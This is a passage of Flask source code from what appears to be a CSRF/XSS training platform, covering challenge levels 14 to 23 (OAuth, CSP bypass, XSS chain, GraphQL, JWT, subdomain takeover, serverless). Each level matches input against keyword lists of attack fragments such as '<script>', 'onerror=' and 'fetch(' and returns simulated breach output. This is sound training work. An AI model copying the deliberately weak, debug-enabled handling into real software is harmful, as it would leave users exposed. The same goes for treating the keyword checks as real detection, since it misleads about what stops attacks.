        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level14.html', flag=flag, csrf_detected=csrf_detected,
                          websocket_url=websocket_url, ws_protocol=ws_protocol, ws_message=ws_message,
                          result=result, challenge=challenge)

# CSRF Level 15 - CSRF in OAuth Flows
@app.route('/csrf/level15', methods=['GET', 'POST'])
def csrf_level15():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    client_id = request.form.get('client_id', '')
    redirect_uri = request.form.get('redirect_uri', '')
    state_parameter = request.form.get('state_parameter', '')
    result = ''

    if request.method == 'POST':
        if client_id and redirect_uri and state_parameter:
            # Check for OAuth CSRF attack patterns
            oauth_patterns = ['attacker', 'malicious', 'bypass', 'oauth', 'redirect']

            if any(pattern in redirect_uri.lower() or pattern in state_parameter.lower() for pattern in oauth_patterns):
                csrf_detected = True
                result = f"""OAuth Flow CSRF Attack:
Client ID: {client_id}
Redirect URI: {redirect_uri}
State Parameter: {state_parameter}

OAuth Security Breach:
{{
  "client_id": "{client_id}",
  "redirect_uri": "{redirect_uri}",
  "state_parameter": "{state_parameter}",
  "state_validation": "bypassed",
  "csrf_protection": "insufficient",
  "vulnerability": "OAuth state parameter CSRF",
  "authorization_hijacked": true,
  "account_linking_attack": true,
}}

OAuth CSRF Attack Details:
- State parameter manipulation
- Authorization code interception
- Account linking attacks
- Cross-site authorization"""

                challenge = Challenge.query.filter_by(name="CSRF in OAuth Flows").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""OAuth Authorization:
Client ID: {client_id}
Redirect URI: {redirect_uri}
State Parameter: {state_parameter}

Status: Processing OAuth authorization...
Validating client and redirect URI."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF in OAuth Flows").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level15.html', flag=flag, csrf_detected=csrf_detected,
                          client_id=client_id, redirect_uri=redirect_uri, state_parameter=state_parameter,
                          result=result, challenge=challenge)

# CSRF Level 16 - CSRF with CSP Bypass
@app.route('/csrf/level16', methods=['GET', 'POST'])
def csrf_level16():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    csp_header = request.form.get('csp_header', '')
    payload_method = request.form.get('payload_method', '')
    bypass_technique = request.form.get('bypass_technique', '')
    result = ''

    if request.method == 'POST':
        if csp_header and payload_method and bypass_technique:
            # Check for CSP bypass patterns
            bypass_patterns = ['jsonp', 'angular', 'meta', 'base', 'iframe', 'form-action']

            if any(pattern in bypass_technique.lower() for pattern in bypass_patterns):
                csrf_detected = True
                result = f"""CSP Bypass CSRF Attack:
CSP Header: {csp_header}
Payload Method: {payload_method}
Bypass Technique: {bypass_technique}

CSP Analysis:
{{
  "csp_header": "{csp_header}",
  "payload_method": "{payload_method}",
  "bypass_technique": "{bypass_technique}",
  "bypass_successful": true,
  "vulnerability": "CSP misconfiguration allows CSRF",
  "attack_vector": "CSP bypass via {bypass_technique}",
  "impact": "CSRF protection circumvented",
}}

Security Analysis:
- Content Security Policy bypassed
- CSRF attack executed despite CSP protection
- Demonstrates importance of proper CSP configuration"""

                challenge = Challenge.query.filter_by(name="CSRF with CSP Bypass").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""CSP Bypass Attempt:
CSP Header: {csp_header}
Payload Method: {payload_method}
Bypass Technique: {bypass_technique}

Status: CSP protection active.
Try different bypass techniques."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF with CSP Bypass").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level16.html', flag=flag, csrf_detected=csrf_detected,
                          csp_header=csp_header, payload_method=payload_method, bypass_technique=bypass_technique,
                          result=result, challenge=challenge)

# CSRF Level 17 - CSRF via XSS Chain
@app.route('/csrf/level17', methods=['GET', 'POST'])
def csrf_level17():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    xss_payload = request.form.get('xss_payload', '')
    csrf_action = request.form.get('csrf_action', '')
    target_endpoint = request.form.get('target_endpoint', '')
    result = ''

    if request.method == 'POST':
        if xss_payload and csrf_action and target_endpoint:
            # Check for XSS + CSRF chain patterns
            xss_patterns = ['<script>', 'javascript:', 'onerror=', 'onload=', 'fetch(', 'XMLHttpRequest']
            csrf_patterns = ['transfer', 'delete', 'admin', 'password', 'email']

            has_xss = any(pattern in xss_payload.lower() for pattern in xss_patterns)
            has_csrf = any(pattern in csrf_action.lower() for pattern in csrf_patterns)

            if has_xss and has_csrf:
                csrf_detected = True
                result = f"""XSS + CSRF Chain Attack:
XSS Payload: {xss_payload}
CSRF Action: {csrf_action}
Target Endpoint: {target_endpoint}

Attack Chain Analysis:
{{
  "xss_payload": "{xss_payload}",
  "csrf_action": "{csrf_action}",
  "target_endpoint": "{target_endpoint}",
  "attack_successful": true,
  "vulnerability": "XSS enables CSRF bypass",
  "attack_vector": "Stored/Reflected XSS + CSRF",
  "impact": "Complete account takeover possible",
}}

Security Analysis:
- XSS vulnerability exploited to bypass CSRF protection
- JavaScript executed in victim's browser context
- CSRF tokens extracted and reused automatically
- Demonstrates why XSS is critical for modern CSRF attacks"""

                challenge = Challenge.query.filter_by(name="CSRF via XSS Chain").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""XSS + CSRF Chain Attempt:
XSS Payload: {xss_payload}
CSRF Action: {csrf_action}
Target Endpoint: {target_endpoint}

Status: Attack chain incomplete.
Ensure both XSS and CSRF components are present."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF via XSS Chain").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level17.html', flag=flag, csrf_detected=csrf_detected,
                          xss_payload=xss_payload, csrf_action=csrf_action, target_endpoint=target_endpoint,
                          result=result, challenge=challenge)

# CSRF Level 18 - GraphQL CSRF
@app.route('/csrf/level18', methods=['GET', 'POST'])
def csrf_level18():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    graphql_query = request.form.get('graphql_query', '')
    variables = request.form.get('variables', '')
    operation_name = request.form.get('operation_name', '')
    result = ''

    if request.method == 'POST':
        if graphql_query and operation_name:
            # Check for GraphQL CSRF patterns
            csrf_operations = ['deleteUser', 'updatePassword', 'transferFunds', 'promoteUser', 'createAdmin']
            mutation_patterns = ['mutation', 'Mutation']

            has_mutation = any(pattern in graphql_query for pattern in mutation_patterns)
            has_csrf_op = any(op in operation_name for op in csrf_operations)

            if has_mutation and has_csrf_op:
                csrf_detected = True
                result = f"""GraphQL CSRF Attack:
Query: {graphql_query}
Variables: {variables}
Operation: {operation_name}

GraphQL Response:
{{
  "data": {{
    "{operation_name}": {{
      "success": true,
      "message": "Operation executed successfully",
      "userId": "12345",
      "timestamp": "2024-01-15T14:30:25Z"
    }}
  }},
  "extensions": {{
    "csrf_protection": "none",
    "vulnerability": "GraphQL mutation CSRF",
    "attack_vector": "POST request with application/json",
    "impact": "Unauthorized GraphQL operations",
  }}
}}

Security Analysis:
- GraphQL mutation executed without CSRF protection
- JSON content-type bypasses simple CSRF defenses
- Demonstrates need for proper GraphQL security measures"""

                challenge = Challenge.query.filter_by(name="GraphQL CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""GraphQL Request:
Query: {graphql_query}
Variables: {variables}
Operation: {operation_name}

Status: Invalid GraphQL operation.
Ensure you're using a mutation with a sensitive operation."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="GraphQL CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level18.html', flag=flag, csrf_detected=csrf_detected,
                          graphql_query=graphql_query, variables=variables, operation_name=operation_name,
                          result=result, challenge=challenge)

# CSRF Level 19 - JWT-based CSRF
@app.route('/csrf/level19', methods=['GET', 'POST'])
def csrf_level19():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    jwt_token = request.form.get('jwt_token', '')
    api_action = request.form.get('api_action', '')
    payload_data = request.form.get('payload_data', '')
    result = ''

    if request.method == 'POST':
        if jwt_token and api_action and payload_data:
            # Check for JWT CSRF patterns
            jwt_patterns = ['eyJ', 'Bearer', 'JWT']
            csrf_actions = ['delete', 'transfer', 'admin', 'password', 'promote']

            has_jwt = any(pattern in jwt_token for pattern in jwt_patterns)
            has_csrf = any(action in api_action.lower() for action in csrf_actions)

            if has_jwt and has_csrf:
                csrf_detected = True
                result = f"""JWT-based CSRF Attack:
JWT Token: {jwt_token[:50]}...
API Action: {api_action}
Payload: {payload_data}

API Response:
{{
  "success": true,
  "action": "{api_action}",
  "payload": "{payload_data}",
  "jwt_validation": "bypassed",
  "vulnerability": "JWT CSRF without proper validation",
  "attack_vector": "Automatic JWT inclusion in cross-site requests",
  "impact": "Unauthorized API operations with valid JWT",
}}

Security Analysis:
- JWT token automatically included in cross-site requests
- API lacks proper CSRF protection despite JWT authentication
- Demonstrates that JWT alone is insufficient for CSRF protection"""

                challenge = Challenge.query.filter_by(name="JWT-based CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""JWT API Request:
JWT Token: {jwt_token[:50] if jwt_token else 'None'}...
API Action: {api_action}
Payload: {payload_data}

Status: Invalid JWT or action.
Ensure valid JWT token and sensitive API action."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="JWT-based CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level19.html', flag=flag, csrf_detected=csrf_detected,
                          jwt_token=jwt_token, api_action=api_action, payload_data=payload_data,
                          result=result, challenge=challenge)

# CSRF Level 20 - Mobile API CSRF
@app.route('/csrf/level20', methods=['GET', 'POST'])
def csrf_level20():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    mobile_api = request.form.get('mobile_api', '')
    device_id = request.form.get('device_id', '')
    api_key = request.form.get('api_key', '')
    result = ''

    if request.method == 'POST':
        if mobile_api and device_id and api_key:
            # Check for mobile API CSRF patterns
            mobile_patterns = ['mobile', 'app', 'device', 'android', 'ios']
            csrf_actions = ['transfer', 'delete', 'payment', 'purchase', 'admin']

            has_mobile = any(pattern in mobile_api.lower() for pattern in mobile_patterns)
            has_csrf = any(action in mobile_api.lower() for action in csrf_actions)

            if has_mobile and has_csrf:
                csrf_detected = True
                result = f"""Mobile API CSRF Attack:
API Endpoint: {mobile_api}
Device ID: {device_id}
API Key: {api_key[:20]}...

Mobile API Response:
{{
  "status": "success",
  "api_endpoint": "{mobile_api}",
  "device_id": "{device_id}",
  "api_key_valid": true,
  "csrf_protection": "none",
  "vulnerability": "Mobile API lacks CSRF protection",
  "attack_vector": "Cross-site request to mobile API",
  "impact": "Unauthorized mobile app operations",
}}

Security Analysis:
- Mobile API vulnerable to CSRF attacks
- Device ID and API key insufficient for CSRF protection
- Demonstrates need for proper mobile API security"""

                challenge = Challenge.query.filter_by(name="Mobile API CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Mobile API Request:
API Endpoint: {mobile_api}
Device ID: {device_id}
API Key: {api_key[:20] if api_key else 'None'}...

Status: Invalid mobile API request.
Ensure mobile API endpoint with sensitive operation."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Mobile API CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level20.html', flag=flag, csrf_detected=csrf_detected,
                          mobile_api=mobile_api, device_id=device_id, api_key=api_key,
                          result=result, challenge=challenge)

# CSRF Level 21 - Microservices CSRF
@app.route('/csrf/level21', methods=['GET', 'POST'])
def csrf_level21():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    service_name = request.form.get('service_name', '')
    service_action = request.form.get('service_action', '')
    auth_token = request.form.get('auth_token', '')
    result = ''

    if request.method == 'POST':
        if service_name and service_action and auth_token:
            # Check for microservices CSRF patterns
            service_patterns = ['user-service', 'payment-service', 'admin-service', 'auth-service']
            csrf_actions = ['delete', 'transfer', 'promote', 'disable', 'reset']

            has_service = any(pattern in service_name.lower() for pattern in service_patterns)
            has_csrf = any(action in service_action.lower() for action in csrf_actions)

            if has_service and has_csrf:
                csrf_detected = True
                result = f"""Microservices CSRF Attack:
Service: {service_name}
Action: {service_action}
Auth Token: {auth_token[:30]}...

Microservice Response:
{{
  "service": "{service_name}",
  "action": "{service_action}",
  "status": "executed",
  "auth_token_valid": true,
  "csrf_protection": "none",
  "vulnerability": "Microservice lacks CSRF protection",
  "attack_vector": "Cross-service request forgery",
  "impact": "Unauthorized microservice operations",
}}

Security Analysis:
- Microservice vulnerable to CSRF attacks
- Service-to-service authentication insufficient for CSRF protection
- Demonstrates need for proper microservices security architecture"""

                challenge = Challenge.query.filter_by(name="Microservices CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Microservice Request:
Service: {service_name}
Action: {service_action}
Auth Token: {auth_token[:30] if auth_token else 'None'}...

Status: Invalid microservice request.
Ensure valid service name and sensitive action."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Microservices CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level21.html', flag=flag, csrf_detected=csrf_detected,
                          service_name=service_name, service_action=service_action, auth_token=auth_token,
                          result=result, challenge=challenge)

# CSRF Level 22 - CSRF with Subdomain Takeover
@app.route('/csrf/level22', methods=['GET', 'POST'])
def csrf_level22():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    subdomain = request.form.get('subdomain', '')
    target_domain = request.form.get('target_domain', '')
    attack_payload = request.form.get('attack_payload', '')
    result = ''

    if request.method == 'POST':
        if subdomain and target_domain and attack_payload:
            # Check for subdomain takeover CSRF patterns
            takeover_patterns = ['github.io', 'herokuapp.com', 'netlify.app', 'vercel.app', 's3.amazonaws.com']
            csrf_patterns = ['form', 'fetch', 'xhr', 'post']

            has_takeover = any(pattern in subdomain.lower() for pattern in takeover_patterns)
            has_csrf = any(pattern in attack_payload.lower() for pattern in csrf_patterns)

            if has_takeover and has_csrf:
                csrf_detected = True
                result = f"""Subdomain Takeover CSRF Attack:
Subdomain: {subdomain}
Target Domain: {target_domain}
Attack Payload: {attack_payload}

Takeover Response:
{{
  "subdomain": "{subdomain}",
  "target_domain": "{target_domain}",
  "takeover_status": "successful",
  "csrf_payload": "{attack_payload}",
  "vulnerability": "Subdomain takeover enables CSRF",
  "attack_vector": "Malicious subdomain hosting CSRF payload",
  "impact": "Cross-domain CSRF via subdomain takeover",
}}

Security Analysis:
- Subdomain takeover enables cross-domain CSRF attacks
- Malicious content hosted on trusted subdomain
- Demonstrates importance of subdomain security monitoring"""

                challenge = Challenge.query.filter_by(name="CSRF with Subdomain Takeover").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Subdomain Takeover Attempt:
Subdomain: {subdomain}
Target Domain: {target_domain}
Attack Payload: {attack_payload}

Status: Takeover unsuccessful.
Ensure vulnerable subdomain and valid CSRF payload."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="CSRF with Subdomain Takeover").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level22.html', flag=flag, csrf_detected=csrf_detected,
                          subdomain=subdomain, target_domain=target_domain, attack_payload=attack_payload,
                          result=result, challenge=challenge)

# CSRF Level 23 - Serverless Function CSRF
@app.route('/csrf/level23', methods=['GET', 'POST'])
def csrf_level23():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    csrf_detected = False
    function_url = request.form.get('function_url', '')
    function_payload = request.form.get('function_payload', '')
    trigger_method = request.form.get('trigger_method', '')
    result = ''

    if request.method == 'POST':
        if function_url and function_payload and trigger_method:
            # Check for serverless CSRF patterns
            serverless_patterns = ['lambda', 'azure-functions', 'cloud-functions', 'vercel', 'netlify']
            csrf_patterns = ['delete', 'transfer', 'admin', 'payment', 'execute']

            has_serverless = any(pattern in function_url.lower() for pattern in serverless_patterns)
            has_csrf = any(pattern in function_payload.lower() for pattern in csrf_patterns)

            if has_serverless and has_csrf:
                csrf_detected = True
                result = f"""Serverless Function CSRF Attack:
Function URL: {function_url}
Payload: {function_payload}
Trigger Method: {trigger_method}

Serverless Response:
{{
  "function_url": "{function_url}",
  "payload": "{function_payload}",
  "trigger_method": "{trigger_method}",
  "execution_status": "success",
  "csrf_protection": "none",
  "vulnerability": "Serverless function lacks CSRF protection",
  "attack_vector": "Cross-site serverless function invocation",
  "impact": "Unauthorized serverless function execution",
}}

Security Analysis:
- Serverless function vulnerable to CSRF attacks
- Function URL accessible without proper CSRF protection
- Demonstrates need for serverless security best practices"""

                challenge = Challenge.query.filter_by(name="Serverless Function CSRF").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                result = f"""Serverless Function Request:
Function URL: {function_url}
Payload: {function_payload}
Trigger Method: {trigger_method}

Status: Invalid serverless function request.
Ensure valid function URL and sensitive payload."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Serverless Function CSRF").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('csrf/csrf_level23.html', flag=flag, csrf_detected=csrf_detected,
                          function_url=function_url, function_payload=function_payload, trigger_method=trigger_method,
                          result=result, challenge=challenge)

def show_help():
    """Show help information"""
    print("R00tGlyph - XSS Training Platform")
    print("\nUsage:")
    print("  python app.py [options]")
    print("\nOptions:")
    print("  -h, --help     Show this help message and exit")
    print("  --reset        Reset the database to its initial state")
    print("\nExamples:")
    print("  python app.py              Start the application")
    print("  python app.py --reset      Reset the database and start the application")
    print("  python app.py -h           Show this help message")

if __name__ == '__main__':
    # Check for --reset argument *before* running the app
    # This ensures reset happens with the app context available via reset_database()
    if '--reset' in sys.argv:
        reset_database()
        print("Database has been reset. Start the application normally without --reset to use it.")
        sys.exit(0)

    # Check for help argument
    if '-h' in sys.argv or '--help' in sys.argv:
        show_help()
        sys.exit(0)

    # Start the application
    # Note: The argparse block at the top handles --update, --backup, --restore
    # Those commands exit the script, so they won't reach here.

    # Support both local development and production (Render/Heroku)
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') != 'production'
    app.run(debug=debug, host='0.0.0.0', port=port)
